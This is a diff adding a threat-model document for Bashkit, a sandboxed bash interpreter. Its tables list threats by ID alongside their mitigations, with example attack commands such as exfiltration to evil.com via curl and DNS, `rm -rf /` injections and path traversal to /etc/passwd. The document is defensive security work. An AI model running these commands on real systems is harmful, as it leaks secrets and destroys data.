@@ -1,0 +1,1005 @@
+# Threat Model
+
+Bashkit is designed to execute untrusted bash scripts safely in virtual environments.
+This document describes the security threats we address and how they are mitigated.
+
+**See also:**
+- [API Documentation](https://docs.rs/bashkit) - Full API reference
+- [Custom Builtins](./custom_builtins.md) - Extending Bashkit safely
+- [Compatibility Reference](./compatibility.md) - Supported bash features
+- [Logging Guide](./logging.md) - Structured logging with security (TM-LOG-*)
+
+## Overview
+
+Bashkit assumes all script input is potentially malicious. The virtual environment prevents:
+
+- **Resource exhaustion** (CPU, memory, disk)
+- **Sandbox escape** (filesystem, process, privilege)
+- **Information disclosure** (secrets, host info)
+- **Network abuse** (exfiltration, unauthorized access)
+
+## Threat Categories
+
+### Denial of Service (TM-DOS-*)
+
+Scripts may attempt to exhaust system resources. Bashkit mitigates these attacks
+through configurable limits.
+
+**Memory Exhaustion:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Large input (TM-DOS-001) | 1GB script | `max_input_bytes` limit (10MB) | MITIGATED |
+| Output flooding (TM-DOS-002) | `yes \| head -n 1000000000` | Command limit stops loop | MITIGATED |
+| Variable explosion (TM-DOS-003) | `x=$(cat /dev/urandom)` | /dev/urandom returns bounded 8KB | MITIGATED |
+| Array growth (TM-DOS-004) | `arr+=(element)` in loop | Command limit | MITIGATED |
+
+**Filesystem Exhaustion:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Large file (TM-DOS-005) | `dd if=/dev/zero bs=1G count=100` | `max_file_size` limit | MITIGATED |
+| Many files (TM-DOS-006) | Create 1M files | `max_file_count` | MITIGATED |
+| Zip bomb (TM-DOS-007) | `gunzip bomb.gz` | Decompression limit | MITIGATED |
+| Archive allocation-before-check (TM-DOS-102) | Tiny gzip/bzip2 input expands before quota accounting | Check size/ratio and lease live bytes before output-buffer growth | MITIGATED |
+| Tar bomb (TM-DOS-008) | `tar -xf bomb.tar` | FS limits | MITIGATED |
+| Recursive copy (TM-DOS-009) | `cp -r /tmp /tmp/copy` | FS limits | MITIGATED |
+| Append flood (TM-DOS-010) | `while true; do echo x >> f; done` | FS + loop limits | MITIGATED |
+| Symlink loops (TM-DOS-011) | `ln -s /a /b; ln -s /b /a` | No symlink following | MITIGATED |
+| Deep dirs (TM-DOS-012) | `mkdir -p a/b/c/.../z` (1000 levels) | `max_path_depth` (100) | MITIGATED |
+| Long filenames (TM-DOS-013) | 10KB filename | `max_filename_length` (255) + `max_path_length` (4096) | MITIGATED |
+| Many dir entries (TM-DOS-014) | 1M files in one dir | `max_file_count` | MITIGATED |
+| Unicode path attacks (TM-DOS-015) | RTL override in filename | `validate_path()` rejects control/bidi chars | MITIGATED |
+| TOCTOU append (TM-DOS-034) | Concurrent appends bypass limits | Single write lock | **FIXED** |
+| OverlayFs upper-only check (TM-DOS-035) | `check_write_limits()` ignores lower layer | Combined limit accounting | **MITIGATED** |
+| OverlayFs double-count (TM-DOS-036) | `compute_usage()` counts overwritten files | Subtract overrides | **MITIGATED** |
+| OverlayFs chmod CoW bypass (TM-DOS-037) | chmod writes to unlimited upper | Route through `check_write_limits()` | **MITIGATED** |
+| OverlayFs incomplete whiteout (TM-DOS-038) | `rm -r` misses lower children | Check ancestor whiteouts | **MITIGATED** |
+| Missing validate_path (TM-DOS-039) | VFS methods skip path checks | Add to all methods | **MITIGATED** |
+| 32-bit truncation (TM-DOS-040) | `u64 as usize` on 32-bit | `usize::try_from()` | **MITIGATED** |
+| OverlayFs symlink bypass (TM-DOS-045) | Unlimited symlink creation | Add `check_write_limits()` | **MITIGATED** |
+| MountableFs no validation (TM-DOS-046) | Mounted FS skips `validate_path()` | Add to all methods | **MITIGATED** |
+| Copy skip limit check (TM-DOS-047) | Copy overwrites without limit check | Always `check_write_limits()` | **MITIGATED** |
+| Rename overwrites dirs (TM-DOS-048) | File over directory orphans children | Reject per POSIX | **MITIGATED** |
+
+**Loops and CPU:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| While true (TM-DOS-016) | `while true; do :; done` | Loop limit (10K) | MITIGATED |
+| For loop (TM-DOS-017) | `for i in $(seq 1 inf)` | Loop limit | MITIGATED |
+| Nested loops (TM-DOS-018) | Double for loop | `max_total_loop_iterations` (1M) | MITIGATED |
+| Command flood (TM-DOS-019) | 100K sequential commands | Command limit (10K) | MITIGATED |
+| Long computation (TM-DOS-023) | Complex awk/sed regex, including repeated awk and `[[ =~ ]]` operands | Linear-time engine; bounded runtime regex caches; timeout (30s) | MITIGATED |
+| Regex backtrack (TM-DOS-025) | `grep "a](*b)*c" file` | Regex crate limits | PARTIAL |
+| AWK unbounded loops (TM-DOS-033) | `BEGIN { while(1){} }` | Timeout (30s) backstop | PARTIAL |
+
+**Stack Overflow / Recursion:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Function recursion (TM-DOS-020) | `f() { f; }; f` | Depth limit (100) | MITIGATED |
+| Command sub depth (TM-DOS-021) | `$($($($())))` nesting | Inherited depth/fuel from parent | MITIGATED |
+| Parser depth (TM-DOS-022) | `(((((...))))))` nesting | `max_ast_depth` + hard cap (100) | MITIGATED |
+| Arithmetic depth (TM-DOS-026) | `$(((((...))))))` | `MAX_ARITHMETIC_DEPTH` (50) | MITIGATED |
+| Builtin parser depth (TM-DOS-027) | Deeply nested awk/jq | `MAX_AWK_PARSER_DEPTH` (100) + `MAX_JQ_JSON_DEPTH` (100) | MITIGATED |
+| Collect dirs recursion (TM-DOS-049) | Deep VFS tree | Mitigated by `max_path_depth` | MITIGATED |
+
+**Parser and Arithmetic:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Parser hang (TM-DOS-024) | Malformed input | `parser_timeout` + `max_parser_operations` | MITIGATED |
+| Diff DoS (TM-DOS-028) | `diff` on large unrelated files | LCS matrix cap (10M cells) | MITIGATED |
+| Parser limit bypass (TM-DOS-030) | eval/source ignore limits | `Parser::with_limits()` | **FIXED** |
+| Arithmetic overflow (TM-DOS-029) | `$(( 2 ** -1 ))` | Use wrapping arithmetic | **MITIGATED** |
+| ExtGlob blowup (TM-DOS-031) | `+(a\|aa)` exponential | Add depth limit | **MITIGATED** |
+| Tokio runtime exhaustion (TM-DOS-032) | Rapid `execute_sync()` calls | Shared runtime | **MITIGATED** |
+| Brace range OOM (TM-DOS-041) | `{1..999999999}` | Cap range size | **MITIGATED** |
+| Brace combinatorial (TM-DOS-042) | `{1..100}{1..100}{1..100}` | Cap total expansion | **MITIGATED** |
+| Compound assign overflow (TM-DOS-043) | `((x+=1))` with x=i64::MAX | `wrapping_*` ops | **MITIGATED** |
+| Lexer stack overflow (TM-DOS-044) | ~50 nested `$()` in quotes | Depth tracking | **MITIGATED** |
+| parse_word_string limits (TM-DOS-050) | Parameter expansion ignores limits | Propagate limits | **MITIGATED** |
+| Removed YAML helper parser (TM-DOS-051) | Former custom parser recursed over indentation | Parser deleted; yq uses TM-DOS-101 controls | **REMOVED** |
+| Template engine recursion (TM-DOS-052) | Nested `{{#if}}`/`{{#each}}` overflow | Add depth limit | **MITIGATED** |
+| Template output explosion (TM-DOS-053) | `{{#each}}` on large array | Bounded by `max_file_size` | MITIGATED |
+| glob ExtGlob blowup (TM-DOS-054) | `glob --files "+(a\|aa)"` | Same as TM-DOS-031 | **MITIGATED** |
+| split file count (TM-DOS-055) | `split -l 1 bigfile` | FS `max_file_count` limit | MITIGATED |
+| source self-recursion (TM-DOS-056) | Script that sources itself | Track source depth | **MITIGATED** |
+| sleep bypasses timeout (TM-DOS-057) | `sleep N` ignores `ExecutionLimits::timeout` | Implement tokio timeout wrapper | **PARTIAL** |
+| Unbounded builtin output (TM-DOS-058) | `seq 1 1000000` produces 1M lines | Add `max_stdout_bytes` limit | **MITIGATED** |
+| Param expansion bomb (TM-DOS-059) | `${x//a/bigstring}` multiplicative amplification | `max_total_variable_bytes` + `max_stdout_bytes` | MITIGATED |
+| Sparse array huge-index (TM-DOS-060) | `arr[999999999]=x` | HashMap storage; `max_array_entries` | MITIGATED |
+| Snapshot restore bypasses function/parser limits (TM-DOS-061) | Crafted snapshot with oversized/deep function bodies | Re-parse restored function source under current limits; re-check function memory budget | MITIGATED |
+| Persistent fd exhaustion (TM-DOS-063) | `exec N>/tmp/f` across many `N` values | `max_file_descriptors` caps custom persistent descriptors | MITIGATED |
+
+**Configuration:**
+```rust
+use bashkit::{Bash, ExecutionLimits, FsLimits, InMemoryFs};
+use std::sync::Arc;
+use std::time::Duration;
+
+# fn main() {
+let limits = ExecutionLimits::new()
+    .max_commands(10_000)
+    .max_loop_iterations(10_000)
+    .max_function_depth(100)
+    .timeout(Duration::from_secs(30))
+    .max_input_bytes(10_000_000);  // 10MB
+
+let fs_limits = FsLimits::new()
+    .max_total_bytes(100_000_000)  // 100MB
+    .max_file_size(10_000_000)     // 10MB per file
+    .max_file_count(10_000);
+
+let fs = Arc::new(InMemoryFs::with_limits(fs_limits));
+let bash = Bash::builder()
+    .limits(limits)
+    .fs(fs)
+    .build();
+# }
+```
+
+**Additional DoS hardening:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| jq file-binding amplification (TM-DOS-062) | Repeated `--rawfile`/`--slurpfile` of one max-size VFS file | `MAX_FILE_VAR_REQUESTS` + cumulative `MAX_FILE_VAR_BYTES` caps | MITIGATED |
+| Heredoc suffix re-injection (TM-DOS-064) | Many `: <<E && : <<E …` on one line | Re-injected suffix charged to `max_parser_operations` fuel | MITIGATED |
+| Command-substitution OOM (TM-DOS-088) | Deeply nested `$()` clones state | Dedicated `max_subst_depth` (default 32) | FIXED |
+| Command-substitution stack overflow (TM-DOS-089) | ~20-30 nested `$()` levels | `Box::pin` expansion/subst caps per-level stack | FIXED |
+| `shuf` range/repeat materialization (TM-DOS-090) | Huge `--input-range`/`--head-count` | Sample without full collection; reject oversized ranges | FIXED |
+| SQLite `.dump` output bypass (TM-DOS-091) | `.dump` builds full string before the cap check | `bounded_append()` enforces `max_output_bytes` per row | FIXED |
+| Subshell snapshot amplification (TM-DOS-092) | Deeply nested `( … )` | `max_subshell_depth` counter (default 32) | MITIGATED |
+| jq unbounded generator (TM-DOS-093) | `jq -n 'repeat(1)'` / `range(0;1e18)` | Cap output at `max_stdout_bytes`; poll deadline every 4096 values | FIXED |
+| Persistent history memory DoS (TM-DOS-094) | Unbounded command history in long-lived instances | `ExecutionLimits` caps history entries/bytes/output | FIXED |
+| Multi-component glob amplification (TM-DOS-095) | `/*/*/*/*` multiplies the candidate set at each component | Reject patterns deeper than `max_path_depth`; cap live candidates at `max_file_count` | FIXED |
+| Aggregate budget refresh (TM-DOS-096) | Nest/mix parsers, pipelines, traversal, runtimes, archives, and callbacks to restart local ceilings | One poisoned request-scoped `ExecutionBudget` meters aggregate work/input/live bytes without replacing subsystem caps | MITIGATED |
+| Contradictory execution-profile limits (TM-DOS-097) | Host config silently requests ineffective or impossible limits | Validate profile cross-field invariants before `BashBuilder` accepts it | MITIGATED |
+| Suspended host-call retention (TM-DOS-098) | Script repeats event-backed calls or host never resumes one | Capacity-one channel, normal execution limits, and handle-owned session released on drop | MITIGATED |
+| `time` report amplification (TM-DOS-099) | Attacker-controlled `-f` format expands repeatedly or targets the VFS with `-o` | Incremental rendering is capped by the stderr limit before emission or file replacement | MITIGATED |
+| jq control normalization amplification (TM-DOS-100) | Literal controls expand sixfold as `\u00XX` | Charge single-pass work and lease live bytes before allocation growth | MITIGATED |
+| yq structured-data amplification (TM-DOS-101) | Deep/multi-document YAML or JSON, runaway filters, expanded output | Parser depth and 4096-document caps, aggregate budgets, shared jaq work/deadline/output limits, final render cap | MITIGATED |
+| Archive decoder pre-allocation (TM-DOS-102) | Compressed output grows before memory checks | Validate and charge each decoder chunk before reserve/copy | MITIGATED |
+| Post-allocation charging (TM-DOS-103) | Archive/compression buffers grow before their live-byte check | Owning budget-aware string/vector/byte builders charge before reserve, roll back errors, and release on drop | MITIGATED |
+
+### Sandbox Escape (TM-ESC-*)
+
+Scripts may attempt to break out of the sandbox to access the host system.
+
+**Filesystem Escape:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Path traversal (TM-ESC-001) | `cat /../../../etc/passwd` | Path normalization | MITIGATED |
+| Symlink escape (TM-ESC-002) | `ln -s /etc/passwd /tmp/x` | Symlinks not followed | MITIGATED |
+| Real FS access (TM-ESC-003) | Direct syscalls | No real FS by default | MITIGATED |
+| Mount escape (TM-ESC-004) | Mount real paths | MountableFs controlled by caller | MITIGATED |
+| VFS limit bypass (TM-ESC-012) | `add_file()` skips limits | Restrict API visibility | **MITIGATED** |
+| OverlayFs upper() exposed (TM-ESC-013) | `upper()` returns unlimited FS | Restrict visibility | **MITIGATED** |
+| Custom builtins lost (TM-ESC-014) | `std::mem::take` empties builtins | Arc-cloned builtins | **FIXED** |
+| Symlink overlay rename (TM-ESC-016) | `ln -s /etc/passwd x; mv x y` | Overlay rename/copy preserve symlinks | **FIXED** |
+| Namespace source-root or policy escape (TM-ESC-031) | `..` escapes a rebased or nested mount | Normalize before longest-prefix selection; join only the stripped suffix; enforce both mutation endpoints | MITIGATED |
+| Windows host-path namespace escape (TM-ESC-033) | Drive/UNC/device path or reparse point discards the RealFS root | Normalize into the POSIX VFS root; canonicalize existing ancestors; component-aware root check; Windows CI | MITIGATED |
+| Host mount resolver traversal (TM-ESC-034) | `/workspace/../secret` passed to `host_path_for` keeps an unnormalized suffix that escapes the selected host mount when joined | Normalize mount points and lookup paths with the shared POSIX VFS normalizer before longest-prefix selection and host joining | MITIGATED |
+
+**Process Escape:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Shell escape (TM-ESC-005) | `exec /bin/bash` | Not implemented (exit 127) | MITIGATED |
+| External commands (TM-ESC-006) | `./malicious` | Runs in VFS sandbox, no host shell | MITIGATED |
+| Background proc (TM-ESC-007) | `malicious &` | Background not implemented | MITIGATED |
+| eval injection (TM-ESC-008) | `eval "$input"` | Sandboxed eval (builtins only) | MITIGATED |
+| bash/sh re-invoke (TM-ESC-015) | `bash -c "malicious"` | Sandboxed re-invocation | MITIGATED |
+
+**Privilege Escalation:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| sudo/su (TM-ESC-009) | `sudo rm -rf /` | Not implemented | MITIGATED |
+| setuid (TM-ESC-010) | Permission changes | Virtual FS, no real perms | MITIGATED |
+| Capability abuse (TM-ESC-011) | Linux capabilities | Runs in-process | MITIGATED |
+| Mount-rw exposure to untrusted automation (TM-ESC-030) | Running untrusted scripts with `--mount-rw /` | CLI docs mark `--mount-rw` sandbox-breaking; recommend `--mount-ro` when host access is needed | MITIGATED |
+| Permission gate built on static analysis (TM-ESC-032) | `c=rm; $c -rf /data` passes an allowlist check that only reads `analysis.commands` | `analyze()` reports unresolved names as `null` and sets `is_opaque()`; pair it with the `before_tool` hook, which sees the resolved name, see the [script analysis guide](./script-analysis.md) | MITIGATED (advisory API) |
+
+**Virtual Filesystem:**
+
+Bashkit uses an in-memory virtual filesystem by default. Scripts cannot access the
+real filesystem unless explicitly mounted via [`MountableFs`] or composed into a
+bounded [`NamespaceFs`].
+
+```rust
+use bashkit::{Bash, InMemoryFs, MountableFs};
+use std::sync::Arc;
+
+# fn main() {
+// Default: fully isolated in-memory filesystem
+let bash = Bash::new();
+
+// Custom filesystem with explicit mounts (advanced)
+let root = Arc::new(InMemoryFs::new());
+let fs = Arc::new(MountableFs::new(root));
+// fs.mount("/data", Arc::new(InMemoryFs::new()));  // Mount additional filesystems
+# }
+```
+
+### Information Disclosure (TM-INF-*)
+
+Scripts may attempt to leak sensitive information.
+
+**Secrets Access:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Env var leak (TM-INF-001) | `echo $SECRET` | Caller responsibility | CALLER RISK |
+| File secrets (TM-INF-002) | `cat /secrets/key` | Virtual FS isolation | MITIGATED |
+| Proc secrets (TM-INF-003) | `/proc/self/environ` | No /proc filesystem | MITIGATED |
+| Memory dump (TM-INF-004) | Core dumps | No crash dumps | MITIGATED |
+
+**Host Information:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Hostname (TM-INF-005) | `hostname` | Returns configurable virtual value | MITIGATED |
+| Username (TM-INF-006) | `whoami`, `$USER` | Returns configurable virtual value | MITIGATED |
+| IP address (TM-INF-007) | `ip addr`, `ifconfig` | Not implemented | MITIGATED |
+| System info (TM-INF-008) | `uname -a` | Returns configurable virtual values | MITIGATED |
+| User ID (TM-INF-009) | `id` | Returns hardcoded uid=1000 | MITIGATED |
+| Date/time (TM-INF-018) | `date`, `touch -t` | Real time can correlate executions; host timezone could fingerprint the runtime | UTC is the closed default; only sandbox `TZ` selects a static IANA zone; invalid/unsupported values and naive touch stamps use UTC; `fixed_epoch` / `epoch_offset` virtualize the clock | **MITIGATED** |
+| Command timing (TM-INF-033) | `time` as a high-resolution oracle or source of host CPU/RSS data | Portable monotonic/virtual clock; Hardened profile floors to 100 ms; host-process fields are explicitly `unavailable` | **MITIGATED** |
+
+**Network Exfiltration:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| HTTP exfil (TM-INF-010) | `curl evil.com?d=$SECRET` | Network allowlist | MITIGATED |
+| DNS exfil (TM-INF-011) | `nslookup $SECRET.evil.com` | No DNS commands | MITIGATED |
+| Timing channel (TM-INF-012) | Response time variations | Accepted (minimal risk) | ACCEPTED |
+
+**Other Disclosure:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Host env via jq (TM-INF-013) | jq `env` exposes host env | Custom env via `$__bashkit_env__` | **FIXED** |
+| Real PID leak (TM-INF-014) | `$$` returns real PID | Returns virtual PID (1) | **FIXED** |
+| URL creds in errors (TM-INF-015) | Allowlist error echoes full URL | Apply URL redaction | **MITIGATED** |
+| Error msg info leak (TM-INF-016) | Errors expose host paths/IPs | Sanitize error messages | **MITIGATED** |
+| Internal markers leak (TM-INF-017) | `set` / `declare -p` show internals | Filter `is_internal_variable()` | **MITIGATED** |
+| envsubst exposes env (TM-INF-019) | `envsubst` substitutes any `$VAR` | Caller controls env (same as TM-INF-001) | CALLER RISK |
+| template exposes env (TM-INF-020) | `{{var}}` falls back to env | Caller controls env (same as TM-INF-001) | CALLER RISK |
+
+**Build / CI Pipeline:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Fork-PR secret exfil (TM-INF-026) | Fork PR edits `examples/*.rs` or `build.rs` to read `$DOPPLER_TOKEN` / `$ANTHROPIC_API_KEY` from the runner env and exfiltrate; first-time-contributor approval gate runs the workflow from PR head, and `DOPPLER_TOKEN` is the master key to every other secret in the Doppler config | Three-layer fix in `.github/workflows/{ci,js,publish-js}.yml`: (1) fork-guard gates secret-using steps on `head.repo.fork != true`, (2) job-level secrets removed, each step sets only the tokens it needs, (3) `doppler run --only-secrets <KEY>` limits each invocation to the single secret the script reads. `ANTHROPIC_API_KEY` migrated off GH Actions secrets onto Doppler so `DOPPLER_TOKEN` is the only secret CI needs from GitHub | **FIXED** |
+
+**Additional information-disclosure hardening:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Library Debug shapes leak via stderr (TM-INF-022) | `{:?}` dumps internal struct shapes into agent-visible stderr | Static scan forbids Debug formatting in builtins, plus per-tool leak tests and fuzz invariants | MITIGATED |
+| jq `halt`/`halt_error` exits the host process (TM-INF-023) | Filter calls `halt(N)` → `std::process::exit` | Upstream `halt` native stripped; safe replacement returns a jq error | MITIGATED |
+| Host env side-channel via clap `Arg::env` (TM-INF-024) | `ls` resolved `TABSIZE`/`TIME_STYLE` from host env | Codegen strips `.env(...)`; builtins read `ctx.env` only | MITIGATED |
+| Untrusted generated Rust in drift CI (TM-INF-025) | Malicious upstream `uu_app()` runs with a write token | Generator validates the emitted shape; drift workflow splits read/write privilege | FIXED |
+| Publish from unverified release refs (TM-INF-027) | Dispatch publish from a branch or unprotected tag | Dispatch requires `refs/heads/main`; publish gated on real `vX.Y.Z` tags | FIXED |
+| JS `onOutput` errors expose host stack traces (TM-INF-028) | Callback throws, leaking `error.stack` | Propagate `error.message` only; strip absolute/`file://` paths | FIXED |
+| Raw callback errors leak host internals (TM-INF-030) | Tool callback throws API keys/connection strings/stack traces | `sanitize_errors` defaults on for `ScriptedTool`/`ToolImpl`/`ToolRegistry` across shell/Python/TypeScript | MITIGATED |
+| `final_env` capture bypasses filtering/caps (TM-INF-031) | `capture_final_env` leaks internal markers or exceeds caps | Visibility filter + output-byte cap applied when building `final_env` | MITIGATED |
+| Imported competitor fixture executes upstream code (TM-INF-032) | Automated import runs a compromised upstream script in CI | Fixtures are manually reviewed, checked-in JSON; CI never fetches upstream; host-Bash execution requires an explicit oracle | MITIGATED |
+| Stack backtrace disclosure (TM-INF-021) | Panics leak source paths, dep versions, function names via stderr | Custom panic hook suppresses backtraces in the CLI | MITIGATED |
+
+**Caller Responsibility (TM-INF-001):**
+
+Do NOT pass sensitive environment variables to untrusted scripts:
+
+```rust
+# use bashkit::Bash;
+// UNSAFE - secrets may be leaked
+let bash = Bash::builder()
+    .env("DATABASE_URL", "postgres://user:pass@host/db")
+    .env("API_KEY", "sk-secret-key")
+    .build();
+
+// SAFE - only pass non-sensitive variables
+let bash = Bash::builder()
+    .env("HOME", "/home/user")
+    .env("TERM", "xterm")
+    .build();
+```
+
+**System Information:**
+
+System builtins return configurable virtual values, never real host information:
+
+```rust
+# use bashkit::Bash;
+let bash = Bash::builder()
+    .username("sandbox")         // whoami returns "sandbox"
+    .hostname("bashkit-sandbox") // hostname returns "bashkit-sandbox"
+    .build();
+```
+
+### Network Security (TM-NET-*)
+
+Network access is disabled by default. When enabled, strict controls apply.
+
+**DNS:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| DNS spoofing (TM-NET-001) | Resolve to wrong IP | No DNS resolution | MITIGATED |
+| DNS rebinding (TM-NET-002) | Rebind after allowlist check | Literal host matching | MITIGATED |
+| DNS exfiltration (TM-NET-003) | `dig secret.evil.com` | No DNS commands | MITIGATED |
+
+**Network Bypass:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| IP instead of host (TM-NET-004) | `curl http://93.184.216.34` | Literal IP blocked unless allowed | MITIGATED |
+| Port scanning (TM-NET-005) | `curl http://internal:$port` | Port must match allowlist | MITIGATED |
+| Protocol downgrade (TM-NET-006) | HTTPS to HTTP | Scheme must match | MITIGATED |
+| Subdomain bypass (TM-NET-007) | `evil.example.com` | Exact host match | MITIGATED |
+
+**HTTP Attacks:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Large response (TM-NET-008) | 10GB download | Size limit (10MB) | MITIGATED |
+| Connection hang (TM-NET-009) | Server never responds | Connect timeout (10s) | MITIGATED |
+| Slowloris (TM-NET-010) | Slow response dripping | Read timeout (30s) | MITIGATED |
+| Redirect bypass (TM-NET-011) | `Location: http://evil.com` | No auto-redirect | MITIGATED |
+| Chunked bomb (TM-NET-012) | Infinite chunked response | Response size limit (streaming) | MITIGATED |
+| Compression bomb (TM-NET-013) | 10KB to 10GB gzip | Auto-decompression disabled | MITIGATED |
+| DNS rebind via redirect (TM-NET-014) | Redirect to rebinded IP | Redirect requires allowlist check | MITIGATED |
+| JSON body injection (TM-NET-018) | `http POST url name='x","admin":true'` | Build JSON via `serde_json`, not string formatting | MITIGATED |
+| Query param injection (TM-NET-019) | `http GET url q=='foo&admin=true'` | URL-encode via local x-www-form-urlencoded encoder | MITIGATED |
+| Form body injection (TM-NET-020) | `http --form url user='x&role=admin'` | URL-encode form fields | MITIGATED |
+| Bot identity spoofing (TM-NET-021) | Forge requests as a trusted bot | Ed25519 request signing (bot-auth feature, opt-in) | MITIGATED |
+| IPv4-mapped IPv6 SSRF bypass (TM-NET-022) | AAAA returns `::ffff:127.0.0.1` / metadata IP | `is_private_ip` normalizes v4-mapped/compatible v6 to v4 and applies the v4 classifier | FIXED |
+| HTTP-transport SSRF via fail-open precheck (TM-NET-023) | Malformed/no-host URL or rebind window bypasses the IP filter | Precheck fails closed on bad URLs; transports receive pinned addresses + `is_private_ip` | MITIGATED |
+| Repeated curl data bypasses body cap (TM-NET-028) | Many data/file parts plus encoding expansion exceed 10 MB in aggregate | Checked aggregate appends; file metadata checked against remaining capacity before reads | MITIGATED |
+
+**Credential Injection (TM-NET-024–027):**
+
+Per-host HTTP credentials injected by the embedding host without exposing the
+secret to the script (see `knowledge/security/credential-injection.md`).
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Real credential exposed to script (TM-NET-024) | Script reads env var for the secret | Injection mode keeps the secret out of the script env; placeholder mode exposes only a random placeholder replaced on the wire | MITIGATED |
+| Credential exfiltrated to unapproved host (TM-NET-025) | Send credential to attacker host | Injection scoped to allowlist patterns; substitution only for matching destinations | MITIGATED |
+| `Authorization` spoofing (TM-NET-026) | Script sets competing same-name header | Overwrite semantics, injected headers replace script-set headers | MITIGATED |
+| Credential leak in errors/traces (TM-NET-027) | Value surfaces in error or trace log | Redacted on all error paths; traces show `[CREDENTIAL]`; `Credential` `Debug` redacts values | MITIGATED |
+
+**Availability, Fail-Open Auth (TM-AVAIL-001):**
+
+Bot-auth signing and credential injection fail **open**: a transient signing or
+injection failure sends the request unsigned / without the credential rather
+than aborting it. Security enforcement (allowlist, SSRF precheck) still runs;
+only the optional auth augmentation is skipped. Accepted trade-off, the
+destination enforces its own authentication.
+
+**Network Allowlist:**
+
+```rust,ignore
+use bashkit::{Bash, NetworkAllowlist};
+
+// Explicit allowlist - only these URLs can be accessed
+let allowlist = NetworkAllowlist::new()
+    .allow("https://api.example.com")
+    .allow("https://cdn.example.com/assets/");
+
+let bash = Bash::builder()
+    .network(allowlist)
+    .build();
+
+// Scripts can now use curl/wget, but only to allowed URLs
+// curl https://api.example.com/data  → allowed
+// curl https://evil.com              → blocked (exit 7)
+```
+
+**Domain Allowlist (TM-NET-015, TM-NET-016):**
+
+For simpler domain-level control, `allow_domain()` permits all traffic to a domain
+regardless of scheme, port, or path. This is the virtual equivalent of SNI-based
+egress filtering, the same approach used by production sandbox environments.
+
+```rust,ignore
+use bashkit::{Bash, NetworkAllowlist};
+
+// Domain-level: any scheme, port, or path to these hosts
+let allowlist = NetworkAllowlist::new()
+    .allow_domain("api.example.com")
+    .allow_domain("cdn.example.com");
+
+// Both of these are allowed:
+// curl https://api.example.com/v1/data
+// curl http://api.example.com:8080/health
+```
+
+Trade-off: domain rules intentionally skip scheme and port enforcement. Use URL
+patterns (`allow()`) when you need tighter control. Both can be combined.
+
+**No Wildcard Subdomains (TM-NET-017):**
+
+Wildcard patterns like `*.example.com` are not supported. They would enable data
+exfiltration by encoding secrets in subdomains (`curl https://$SECRET.example.com`).
+
+### Injection Attacks (TM-INJ-*)
+
+**Command Injection:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Variable injection (TM-INJ-001) | `$input` containing `; rm -rf /` | Variables expand to strings only | MITIGATED |
+| Backtick injection (TM-INJ-002) | `` `$malicious` `` | Parsed as command sub | MITIGATED |
+| eval bypass (TM-INJ-003) | `eval $user_input` | eval sandboxed (builtins only) | MITIGATED |
+
+**Path Injection:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Null byte (TM-INJ-004) | `cat "file\x00/../etc/passwd"` | Rust strings have no nulls | MITIGATED |
+| Path traversal (TM-INJ-005) | `../../../../etc/passwd` | Path normalization | MITIGATED |
+| Encoding bypass (TM-INJ-006) | URL/unicode encoding | PathBuf handles | MITIGATED |
+| Tar path traversal (TM-INJ-010) | `tar -xf` with `../` entries | Validate extract paths | **MITIGATED** |
+
+**Output / Display:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| HTML in output (TM-INJ-007) | Script outputs `<script>` and caller renders output in a web UI | Caller should HTML-escape output and use a restrictive CSP | CALLER RISK |
+| Terminal escapes (TM-INJ-008) | ANSI sequences in output | Caller should sanitize | CALLER RISK |
+
+**Internal State:**
+
+| Threat | Attack Example | Mitigation | Status |
+|--------|---------------|------------|--------|
+| Internal var injection (TM-INJ-009) | Set `_READONLY_X=""` | Isolate internal namespace | **MITIGATED** |
+| Cyclic nameref (TM-INJ-011) | Cyclic refs resolve silently | Detect cycle, error | **MITIGATED** |
+| declare bypasses guard (TM-INJ-012) | `declare _NAMEREF_x=target` | Add `is_internal_variable()` check | **MITIGATED** |
+| readonly bypasses guard (TM-INJ-013) | `readonly _NAMEREF_x=target` | Add `is_internal_variable()` check | **MITIGATED** |
+| local bypasses guard (TM-INJ-014) | `local _NAMEREF_x=target` | Add `is_internal_variable()` check | **MITIGATED** |
+| export bypasses guard (TM-INJ-015) | `export _NAMEREF_x=target` | Add `is_internal_variable()` check | **MITIGATED** |
+| Missing array prefix (TM-INJ-016) | `_ARRAY_READ_` not in guard | Add prefix to `is_internal_variable()` | **MITIGATED** |
+| Unzip path traversal (TM-INJ-017) | `unzip` with `../` entry names | Validate paths within extract base | **MITIGATED** |
+| Dotenv internal injection (TM-INJ-018) | `.env` with `_NAMEREF_x=target` | Add `is_internal_variable()` check | **MITIGATED** |
+| unset removes readonly (TM-INJ-019) | `readonly X=v; unset X` | Check readonly attribute in unset | **MITIGATED** |
+| declare overwrites readonly (TM-INJ-020) | `readonly X=v; declare X=new` | Check readonly attribute in declare | **MITIGATED** |
